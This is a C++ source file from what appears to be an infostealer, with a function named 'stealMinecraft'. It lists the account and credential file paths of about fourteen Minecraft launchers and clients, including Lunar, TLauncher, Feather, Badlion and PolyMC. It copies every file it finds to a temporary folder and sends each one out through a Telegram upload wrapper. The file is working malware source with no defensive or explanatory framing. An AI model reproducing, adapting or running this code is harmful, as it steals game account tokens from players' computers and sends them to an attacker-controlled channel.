#include "pch.h"
#include "../wrappers/telegram.h"
#include "../debug.h"

#include <filesystem>
#include <cstdlib>
#include <map>

namespace fs = std::filesystem;

namespace grab {
    void stealMinecraft() {
        const char* appDataEnv = std::getenv("APPDATA");
        const char* tempEnv = std::getenv("TEMP");
        const char* userProfile = std::getenv("userprofile");

        fs::path saveTo = fs::path(tempEnv) / "Minecraft_lumma";

        std::map<std::string, fs::path> minecraftPaths = {
            {"Intent", fs::path(userProfile) / "intentlauncher" / "launcherconfig"},
            {"Lunar", fs::path(userProfile) / ".lunarclient" / "settings" / "game" / "accounts.json"},
            {"TLauncher", fs::path(appDataEnv) / ".minecraft" / "TlauncherProfiles.json"},
            {"Feather", fs::path(appDataEnv) / ".feather" / "accounts.json"},
            {"Meteor", fs::path(appDataEnv) / ".minecraft" / "meteor-client" / "accounts.nbt"},
            {"Impact", fs::path(appDataEnv) / ".minecraft" / "Impact" / "alts.json"},
            {"Novoline", fs::path(appDataEnv) / ".minecraft" / "Novoline" / "alts.novo"},
            {"CheatBreakers", fs::path(appDataEnv) / ".minecraft" / "cheatbreaker_accounts.json"},
            {"Microsoft Store", fs::path(appDataEnv) / ".minecraft" / "launcher_accounts_microsoft_store.json"},
            {"Rise", fs::path(appDataEnv) / ".minecraft" / "Rise" / "alts.txt"},
            {"Rise (Intent)", fs::path(userProfile) / "intentlauncher" / "Rise" / "alts.txt"},
            {"Paladium", fs::path(appDataEnv) / "paladium-group" / "accounts.json"},
            {"PolyMC", fs::path(appDataEnv) / "PolyMC" / "accounts.json"},
            {"Badlion", fs::path(appDataEnv) / "Badlion Client" / "accounts.json"}
        };

        std::size_t keys = minecraftPaths.size();

        fs::create_directories(saveTo);

        for (const auto& [key, value] : minecraftPaths) {
            if (fs::exists(value)) {
                Debug::Log(value.string() + " Exists!");
                fs::copy_file(value, saveTo / (key + "_accounts.txt"));

                fs::path file = saveTo / (key + "_accounts.txt");
                telegram::SendDocument(file.string());
            }
        }
    }
}